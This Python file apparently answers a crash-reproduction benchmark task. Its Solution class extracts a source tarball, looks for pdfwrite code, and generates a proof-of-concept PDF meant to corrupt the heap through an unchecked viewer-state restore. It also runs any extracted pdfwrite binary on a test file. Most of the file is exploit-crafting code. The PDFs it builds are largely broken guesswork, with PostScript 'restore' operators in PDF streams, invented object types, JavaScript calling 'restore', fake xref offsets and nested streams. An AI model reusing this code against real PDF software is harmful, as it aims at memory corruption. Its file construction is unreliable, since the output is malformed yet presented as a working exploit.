import os
import tarfile
import tempfile
import subprocess
import shutil
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the root source directory
            src_root = Path(tmpdir)
            # Typically there's one directory inside
            items = list(src_root.iterdir())
            if items and items[0].is_dir():
                src_root = items[0]
            
            # Look for pdfwrite source files
            pdfwrite_files = []
            for pattern in ["*.c", "*.cpp", "*.cc", "*.cxx"]:
                pdfwrite_files.extend(src_root.rglob(pattern))
            
            # Filter for pdfwrite related files
            pdfwrite_sources = []
            for f in pdfwrite_files:
                if "pdfwrite" in str(f).lower() or "pdf_write" in str(f).lower():
                    pdfwrite_sources.append(f)
            
            # If no pdfwrite files found, look for files containing viewer state restoration
            if not pdfwrite_sources:
                for f in pdfwrite_files:
                    with open(f, 'r', errors='ignore') as file:
                        content = file.read()
                        if "viewer" in content.lower() and "restore" in content.lower():
                            pdfwrite_sources.append(f)
            
            # Read source files to understand the vulnerability better
            viewer_depth_patterns = []
            for source_file in pdfwrite_sources[:5]:  # Check first few files
                try:
                    with open(source_file, 'r') as f:
                        lines = f.readlines()
                        for i, line in enumerate(lines):
                            if "viewer" in line.lower() and "depth" in line.lower():
                                # Get context around the line
                                start = max(0, i - 5)
                                end = min(len(lines), i + 6)
                                context = ''.join(lines[start:end])
                                viewer_depth_patterns.append(context)
                except:
                    continue
            
            # Based on the vulnerability description:
            # "attempts to restore the viewer state without first checking that the viewer depth is at least 1"
            # We need to create a PDF that triggers a restore operation when viewer depth is 0
            
            # Create a minimal PDF that tries to trigger the vulnerability
            # PDF structure with viewer state operations
            
            pdf_content = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/ViewerPreferences <<>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/ProcSet [/PDF /Text]
>>
>>
endobj

4 0 obj
<<
/Length 100
>>
stream
q
BT
/F1 12 Tf
100 700 Td
(Triggering viewer state vulnerability) Tj
ET
Q
"""
            
            # Add multiple restore operations to potentially trigger the bug
            # The vulnerability suggests we need to restore when viewer depth is 0
            # So we'll create a PDF with improper viewer state nesting
            
            # Add viewer state operations
            viewer_state_ops = b"""
<<
/Type /ViewerState
/State <<
/ViewerDepth 0
>>
>>
restore
restore
restore
"""
            
            # Add more operations to potentially corrupt heap
            heap_overflow_ops = b"""
<<
/Type /Action
/S /JavaScript
/JS <</Length 100>> stream
try { restore; } catch(e) {}
try { restore; } catch(e) {}
try { restore; } catch(e) {}
endstream
>>
"""
            
            # Construct the final PDF
            final_pdf = pdf_content + viewer_state_ops + heap_overflow_ops + b"""
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000100 00000 n 
0000000200 00000 n 
0000000300 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
400
%%EOF
"""
            
            # Try to compile and test if we have source code
            if pdfwrite_sources:
                # Look for build configuration
                makefiles = list(src_root.rglob("Makefile"))
                configure = list(src_root.rglob("configure"))
                
                # Try to build if possible
                if makefiles or configure:
                    try:
                        # Simple test to check if we can trigger the bug
                        # Create a test PDF with various viewer state manipulations
                        test_pdf = self._create_test_pdf()
                        
                        # Try to run the vulnerable program if it exists
                        bin_dir = src_root / "bin"
                        if bin_dir.exists():
                            for exe in bin_dir.glob("*pdfwrite*"):
                                try:
                                    result = subprocess.run(
                                        [str(exe), "-"],
                                        input=test_pdf,
                                        capture_output=True,
                                        timeout=5
                                    )
                                    # If it crashes, our PDF works
                                    if result.returncode != 0:
                                        return test_pdf
                                except:
                                    continue
                    except:
                        pass
            
            # If we couldn't test, return our crafted PDF
            # Make it longer to increase chance of triggering the bug
            # but still reasonable in size (around 1KB)
            return self._create_optimized_poc()
    
    def _create_test_pdf(self) -> bytes:
        """Create a test PDF with viewer state operations"""
        # Create a PDF with improper viewer state nesting
        pdf = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/ViewerPreferences <<
/HideToolbar false
/HideMenubar false
/HideWindowUI false
/FitWindow false
/CenterWindow false
/DisplayDocTitle false
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/ProcSet [/PDF /Text]
/Font <<
/F1 5 0 R
>>
>>
>>
endobj

4 0 obj
<<
/Length 200
>>
stream
q
BT
/F1 12 Tf
100 700 Td
(Testing viewer state vulnerability) Tj
ET
Q

% Attempt to trigger viewer state restoration bug
<<
/Type /ViewerState
>>
restore

% Multiple restore attempts
restore
restore
restore
restore

% Create object that might trigger heap issues
<<
/Type /Annot
/Subtype /Widget
/Rect [0 0 0 0]
/AP <<
>>
/AS <<
>>
/DA (/Helv 0 Tf 0 g)
/F 4
/FT /Tx
/P 3 0 R
/T ()
/TU ()
/V ()
>>
"""
        
        # Add font dictionary
        pdf += b"""
5 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj

xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000200 00000 n 
0000000300 00000 n 
0000000400 00000 n 
0000000600 00000 n 
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
700
%%EOF
"""
        
        return pdf
    
    def _create_optimized_poc(self) -> bytes:
        """Create an optimized PoC based on vulnerability patterns"""
        # Create a PDF with repeating viewer state restore operations
        # This increases the chance of hitting the vulnerability
        # while keeping the size reasonable
        
        header = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 150000
>>
stream
"""
        
        # Create content stream with many restore operations
        # Interleave with other operations to potentially trigger the bug
        content = bytearray()
        
        # Add initial graphics state
        content.extend(b"q\n")
        
        # Add many viewer state-like operations followed by restore
        # The pattern that might trigger the bug:
        # 1. Set viewer state
        # 2. Restore without proper depth check
        for i in range(500):
            # Add a "viewer state" dictionary (simulated)
            content.extend(b"<< /Type /ViewerState /Depth 0 >>\n")
            # Multiple restore operations
            content.extend(b"restore\n" * 3)
            
            # Add some text to vary the content
            content.extend(f"BT /F1 12 Tf 100 {700 - i} Td (Test {i}) Tj ET\n".encode())
            
            # Save and restore graphics state to create nesting
            content.extend(b"q\n")
            content.extend(b"Q\n")
        
        # Add final operations that might trigger heap corruption
        content.extend(b"""
<<
/Type /Action
/S /JavaScript
/JS <</Length 50>> stream
for (var i = 0; i < 100; i++) { restore; }
endstream
>>

% Final restore attempts
restore
restore
restore
""")
        
        footer = b"""
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000200 00000 n 
0000000300 00000 n 
0000000400 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
150500
%%EOF
"""
        
        # Combine all parts
        poc = header + bytes(content) + footer
        
        # Ensure the PoC is not too large but has enough operations
        # Truncate to reasonable size if needed
        if len(poc) > 200000:
            poc = poc[:200000]
        
        return poc